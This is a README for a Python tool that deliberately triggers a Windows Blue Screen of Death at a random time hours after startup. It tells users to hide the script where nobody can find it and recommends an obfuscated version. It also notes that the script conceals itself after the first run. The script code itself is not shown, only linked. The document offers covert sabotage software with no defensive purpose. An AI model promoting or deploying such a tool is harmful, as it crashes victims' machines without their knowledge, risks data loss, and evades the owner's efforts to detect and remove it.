# bsod_trigger

### What is this?

This is a little python script to trigger a 
**B**lue **S**creen **O**f **D**eath, BSOD for short, after between 3 and 8 
hours from the Windows startup.


### WHY?

Why not?

### Dependencies

1. Python 3.6 or newer
   1. Python must be added to _PATH_ (under installation)


### How to run

After installing python, you just need to save [bsod.py](bsod.py) 
where nobody can find it and double click it.

I suggest using _obfuscated_ version: [joy.py](joy.py)

After script is executed once, it'll become hidden, so, save somewhere else
its path if you want to remove it later
